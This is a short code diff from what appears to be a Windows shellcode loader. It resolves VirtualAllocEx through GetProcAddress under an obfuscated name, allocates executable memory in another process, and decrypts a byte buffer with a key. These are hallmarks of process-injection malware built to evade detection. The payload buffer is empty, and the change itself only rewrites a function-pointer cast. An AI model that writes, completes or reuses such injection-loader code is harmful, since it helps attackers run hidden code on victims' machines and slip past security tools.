@@ -40,8 +40,7 @@ int main() {
 unsigned char itsthecod345[] = {};
 
     
-LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) =
-    (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, "VirtualAllocEx");
+    auto pVirtualAllnocEkx = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, "VirtualAllocEx");
     LPVOID falpo = pVirtualAllnocEkx(pi.hProcess, NULL, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
     ases123enc((char*)  itsthecod345, sizeof(itsthecod345), ke185hams, sizeof(ke185hams));
